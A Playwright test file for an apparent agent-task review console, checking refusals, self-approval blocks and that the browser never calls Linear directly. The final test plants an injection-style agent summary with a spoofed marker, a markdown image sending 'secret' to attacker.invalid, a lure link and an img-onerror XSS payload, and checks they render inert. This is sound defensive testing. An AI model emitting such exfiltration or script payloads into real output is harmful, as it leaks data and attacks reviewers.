import type { Locator, Page } from '@playwright/test';

import { getTeamRoute } from '@/core/constants/team-routes';

import {
  type DispatchMocks,
  type DispatchRouteOptions,
  issueSeeds,
  mockDispatchRoutes,
  reviewEntry,
  taskSummary,
  XSS_COUNTER,
  xssFireCount,
} from './dispatch-fixtures';
import { expect, mockRoutes, test } from './fixtures';

/**
 * The review queue's refusals, notes and absences, from plan sections 5.6
 * and 5.7: every answer the server may give a press, and the negatives the
 * console promises. `milestone-dispatch.spec.ts` covers the happy accept,
 * the digest echo and the first refusals; this file covers the rest of the
 * gate. The small page helpers mirror that spec on purpose, so the two files
 * open the same panel the same way.
 */

const TEAM = 'engineering';
const TEAM_URL = getTeamRoute(TEAM);
const ENTRY_TASK = 'task_real';

async function openTeamPage(
  page: Page,
  options: DispatchRouteOptions = {}
): Promise<DispatchMocks> {
  await mockRoutes.config(page);
  await mockRoutes.agents(page);
  await mockRoutes.teams(page);
  await mockRoutes.teamMilestones(page);
  const mocks = await mockDispatchRoutes(page, options);
  await page.goto(TEAM_URL);
  await expect(page.getByTestId('milestones-list')).toBeVisible();
  return mocks;
}

function milestoneRow(page: Page): Locator {
  return page.getByTestId('milestone-row').first();
}

async function openScope(page: Page): Promise<void> {
  await milestoneRow(page).getByTestId('milestone-start-work').click();
  await expect(
    milestoneRow(page).getByTestId('milestone-work-scope')
  ).toBeVisible();
}

/** A finished real run, the kind whose proposal reaches the queue. */
function realRunTask(taskKey = ENTRY_TASK, sourceRef = issueSeeds[0].ref) {
  return taskSummary({
    task_key: taskKey,
    source_ref: sourceRef,
    status: 'completed',
    current_step: 2,
    dry_run: false,
    updated_at: new Date(Date.now() - 20 * 60_000).toISOString(),
  });
}

/** Same filter the dispatch spec uses: requests that create or move work. */
function mutatingRequests(mocks: DispatchMocks) {
  return mocks.requests.filter(
    (request) =>
      request.method !== 'GET' && !request.url.endsWith('/agent-tasks/import')
  );
}

/**
 * Every URL the browser asked for, on any origin, attached before first
 * paint. The fixture recorder keeps `/api/` paths only; proving nothing left
 * for Linear itself needs the whole traffic, not the mocked slice of it.
 */
function recordAllRequests(page: Page): string[] {
  const urls: string[] = [];
  page.on('request', (request) => urls.push(request.url()));
  return urls;
}

/** Requests bound for Linear. The browser never holds the key to make one. */
function linearBound(urls: string[]): string[] {
  return urls.filter((url) => {
    try {
      return new URL(url).hostname.endsWith('linear.app');
    } catch {
      return false;
    }
  });
}

// =============================================================================
// The answers a press can get, beyond the ones the dispatch spec covers
// =============================================================================

test.describe('A press answered with a refusal or a note', () => {
  test('an issue that left its scope is refused, and the queue is re-read', async ({
    page,
  }) => {
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
        acceptError: {
          status: 409,
          errorCode: 'SCOPE_CHANGED',
          detail:
            'The issue left the milestone it was imported under. ' +
            'Nothing was changed.',
        },
      },
    });
    await openScope(page);

    const readsBefore = mocks.review.queueReads();
    await page.getByTestId('review-accept').click();

    const error = page.getByTestId('review-card-error');
    await expect(error).toContainText('left the milestone');
    await expect(error).toContainText('Nothing was changed.');

    // Refused, not decided, and not retried: one press made one request, the
    // card stayed, and the queue re-read so the next press binds to what is
    // now true.
    await expect(page.getByTestId('review-card')).toHaveCount(1);
    await expect(page.getByTestId('review-decided')).toHaveCount(0);
    await expect
      .poll(() => mocks.review.queueReads())
      .toBeGreaterThan(readsBefore);
    expect(mocks.review.accepts).toHaveLength(1);
  });

  test('a person beating the accept to the close is a note, not an error', async ({
    page,
  }) => {
    await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
        note: 'ALREADY_COMPLETED',
        milestoneProgress: 0.5,
      },
    });
    await openScope(page);

    await page.getByTestId('review-accept').click();

    // A human closing the issue first is the system working, and the row
    // must say so plainly rather than claim a close that did not happen.
    const decided = page.getByTestId('review-decided');
    await expect(decided).toContainText(
      'ENG-101 had already been closed by a person, so nothing was changed.'
    );
    await expect(decided).not.toContainText('is now closed in Linear');
    await expect(decided).toContainText(
      'Milestone issue completion is now 50%.'
    );
    await expect(page.getByTestId('review-card-error')).toHaveCount(0);
  });

  test('the credential that ran the task may not reject its work either', async ({
    page,
  }) => {
    // The server holds the self-approval line on both decisions, with the
    // wording the service actually uses. A reviewer who cannot accept their
    // own work must not be able to bury it as rejected instead.
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
        rejectError: {
          status: 409,
          errorCode: 'SELF_APPROVAL_REFUSED',
          detail:
            'This credential ran the task, so it may not accept or reject ' +
            "the task's work.",
          hint: 'A different person, with a different credential, reviews it.',
        },
      },
    });
    await openScope(page);

    await page.getByTestId('review-reject').click();
    await page
      .getByTestId('review-reject-reason')
      .fill('Trying to bury my own run.');
    await page.getByTestId('review-reject-confirm').click();

    const error = page.getByTestId('review-card-error');
    await expect(error).toContainText("may not accept or reject the task's");
    await expect(error).toContainText(
      'A different person, with a different credential, reviews it.'
    );
    await expect(page.getByTestId('review-decided')).toHaveCount(0);
    await expect(page.getByTestId('review-card')).toHaveCount(1);
    expect(mocks.review.rejects).toHaveLength(1);
  });

  test('a deployment with no caller identity still accepts, and invents no approver', async ({
    page,
  }) => {
    // Under NoAuthProvider nobody has a caller hash, and the server skips the
    // self-approval comparison rather than refusing every accept. The console
    // sees a plain 200 whose writeback names no approver, and it must render
    // the close without inventing one.
    await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
        approvedByHash: null,
      },
    });
    await openScope(page);

    await page.getByTestId('review-accept').click();

    const decided = page.getByTestId('review-decided');
    await expect(decided).toContainText('ENG-101 is now closed in Linear.');
    await expect(page.getByText(/approved by/i)).toHaveCount(0);
    await expect(page.getByTestId('task-review-queue')).not.toContainText(
      'null'
    );
  });

  test('the approving credential is never rendered, as a name or at all', async ({
    page,
  }) => {
    // The keyed deployment's accept response carries `approved_by_hash`, and
    // the plan is blunt about it: that value names a credential, not a
    // person, and every browser caller hashes to the same one. Rendering it
    // anywhere would claim an identity the system does not have.
    await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
      },
    });
    await openScope(page);

    await page.getByTestId('review-accept').click();
    await expect(page.getByTestId('review-decided')).toBeVisible();

    // The fixture's accept response says 'console-hash'. Nothing shows it.
    await expect(page.getByText(/console-hash/)).toHaveCount(0);
    await expect(page.getByText(/approved by/i)).toHaveCount(0);
  });

  test('an entry the server marked stale renders as stale, not approved', async ({
    page,
  }) => {
    await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [
          reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12, stale: true }),
        ],
      },
    });
    await openScope(page);

    const stale = page.getByTestId('task-review-stale');
    await expect(stale).toContainText(
      '1 of these has been waiting more than two days.'
    );
    await expect(stale).toContainText('Nothing here expires into approval.');

    // Stale is a nudge to the human, never a decision: the card still offers
    // both controls and holds its digest.
    await expect(page.getByTestId('review-accept')).toBeEnabled();
    await expect(page.getByTestId('review-reject')).toBeEnabled();
  });

  test('an unreadable queue decides nothing and says so', async ({ page }) => {
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        queueError: {
          status: 503,
          errorCode: 'LINEAR_UNAVAILABLE',
          detail: 'Linear did not answer.',
        },
      },
    });
    await openScope(page);

    const queueError = page.getByTestId('task-review-queue-error');
    await expect(queueError).toContainText('Nothing was decided for you');

    // No card, no button, no guess: an unreadable queue offers no decision,
    // and the finished runs below it still render from the ledger.
    await expect(page.getByTestId('review-card')).toHaveCount(0);
    await expect(page.getByTestId('review-accept')).toHaveCount(0);
    await expect(page.getByTestId('task-run-toggle')).toHaveCount(1);

    // Refused and left alone: the console does not hammer a failing queue.
    // The mount itself costs one read, or two under dev StrictMode's double
    // mount (an errored query refetches on remount where a fresh one dedupes),
    // so the portable claim is boundedness and then silence.
    const readsAfterMount = mocks.review.queueReads();
    expect(readsAfterMount).toBeLessThanOrEqual(2);
    await page.waitForTimeout(1500);
    expect(mocks.review.queueReads()).toBe(readsAfterMount);
    // And it mutates nothing on the strength of an error.
    expect(mutatingRequests(mocks)).toEqual([]);
  });
});

// =============================================================================
// Proof by absence: what never leaves the browser
// =============================================================================

test.describe('What never leaves the browser', () => {
  test('with the write flag off, nothing leaves the browser for Linear', async ({
    page,
  }) => {
    // The shipped default deployment. The queue serves cards, the press is
    // refused server-side, and the proof is what did not happen: no retry,
    // no fallback, and no request of any kind to Linear, whose key the
    // browser never holds.
    const everyRequest = recordAllRequests(page);
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask()],
      review: {
        entries: [reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 })],
        acceptError: {
          status: 409,
          errorCode: 'LINEAR_WRITE_DISABLED',
          detail: 'Write-back to Linear is disabled on this deployment.',
          hint: 'Set AGENT_CONTROL_LINEAR_WRITE_ENABLED=true and restart.',
        },
      },
    });
    await openScope(page);

    await page.getByTestId('review-accept').click();
    await expect(page.getByTestId('review-card-error')).toContainText(
      'disabled on this deployment'
    );

    expect(mocks.review.accepts).toHaveLength(1);
    const mutations = mutatingRequests(mocks);
    expect(mutations).toHaveLength(1);
    expect(mutations[0]?.url).toBe('/api/v1/agent-tasks/task_real/accept');
    expect(linearBound(everyRequest)).toEqual([]);
  });

  test('deciding, either way, talks only to Agent Control', async ({
    page,
  }) => {
    const everyRequest = recordAllRequests(page);
    const first = reviewEntry({ task_key: ENTRY_TASK, writeback_id: 12 });
    const second = reviewEntry({
      task_key: 'task_real_2',
      writeback_id: 13,
      source_ref: issueSeeds[2].ref,
    });
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask(), realRunTask('task_real_2', issueSeeds[2].ref)],
      review: { entries: [first, second] },
    });
    await openScope(page);

    const queue = page.getByTestId('task-review-queue');
    await expect(queue).toContainText('2 results waiting for you');

    // One press decides one card. The other stays whole, its own digest
    // intact, until its own press.
    await queue
      .getByTestId('review-card')
      .filter({ hasText: 'ENG-101' })
      .getByTestId('review-accept')
      .click();
    const decided = page.getByTestId('review-decided');
    await expect(decided).toHaveCount(1);
    await expect(decided).toContainText('ENG-101 is now closed in Linear.');
    // The response carried no progress value, so the row invents none.
    await expect(decided).not.toContainText('Milestone issue completion');
    const remaining = queue.getByTestId('review-card');
    await expect(remaining).toHaveCount(1);
    await expect(remaining).toContainText('ENG-103');
    await expect(queue).toContainText('1 result waiting for you');

    await remaining.getByTestId('review-reject').click();
    await page
      .getByTestId('review-reject-reason')
      .fill('The export retry was not actually added.');
    await page.getByTestId('review-reject-confirm').click();
    await expect(decided).toHaveCount(2);
    await expect(queue).toContainText('ENG-103 stays open');
    await expect(queue).toContainText('Nothing else is waiting for you here');

    // Two decisions, two requests, and not one byte more. A rejected result
    // posts nothing anywhere, and neither decision reached for Linear: the
    // browser spoke to Agent Control alone.
    expect(mocks.review.accepts).toEqual([
      {
        taskKey: ENTRY_TASK,
        body: {
          writeback_id: 12,
          expected_decision_digest: first.decision_digest,
        },
      },
    ]);
    expect(mocks.review.rejects).toEqual([
      {
        taskKey: 'task_real_2',
        body: {
          writeback_id: 13,
          reason: 'The export retry was not actually added.',
        },
      },
    ]);
    expect(
      mutatingRequests(mocks)
        .map((request) => `${request.method} ${request.url}`)
        .sort()
    ).toEqual([
      'POST /api/v1/agent-tasks/task_real/accept',
      'POST /api/v1/agent-tasks/task_real_2/reject',
    ]);
    expect(linearBound(everyRequest)).toEqual([]);
  });

  test('the write-back marker survives its own body, escaped and inert', async ({
    page,
  }) => {
    // 5.6 stamps every posted comment with an HTML-comment marker. An agent
    // that swallowed an injection can emit the marker itself, plus E8's four
    // payloads: a closing fence, an image embed, a markdown link, raw HTML.
    // On this card all five must come out as characters, because the summary
    // is a text node. The marker is the discriminator: parsed as markup an
    // HTML comment has no rendered text, so a sink that interpreted the body
    // would show everything except it.
    const marker = '<!-- agent-control:task:task_real:step:1 -->';
    const summaryBody =
      'Done. Closing the fence now: ```\n' +
      `${marker}\n` +
      '![](https://attacker.invalid/exfil?q=secret)\n' +
      '[click me](https://attacker.invalid/lure)\n' +
      `<img src=q onerror="window.${XSS_COUNTER} = ` +
      `(window.${XSS_COUNTER} || 0) + 1">`;
    const entry = reviewEntry({
      task_key: ENTRY_TASK,
      writeback_id: 12,
      summary: summaryBody,
    });

    const everyRequest = recordAllRequests(page);
    const mocks = await openTeamPage(page, {
      tasks: [realRunTask()],
      review: { entries: [entry] },
    });
    await openScope(page);

    const summary = page.getByTestId('review-card-summary');
    await expect(summary).toContainText(marker);
    await expect(summary).toContainText('```');
    await expect(summary).toContainText(
      '![](https://attacker.invalid/exfil?q=secret)'
    );
    // Nothing became an element: no image to fire a GET on view, no link to
    // follow, no markup at all inside the agent's text.
    await expect(summary.locator('img, a, script')).toHaveCount(0);
    expect(await xssFireCount(page)).toBe(0);
    expect(
      everyRequest.filter((url) => url.includes('attacker.invalid'))
    ).toEqual([]);

    // And the digest the accept echoes is the digest of exactly this body,
    // marker and all: escaping for display changed nothing about what the
    // reviewer authorized.
    await page.getByTestId('review-accept').click();
    await expect(page.getByTestId('review-decided')).toBeVisible();
    expect(mocks.review.accepts).toEqual([
      {
        taskKey: ENTRY_TASK,
        body: {
          writeback_id: 12,
          expected_decision_digest: entry.decision_digest,
        },
      },
    ]);
  });
});
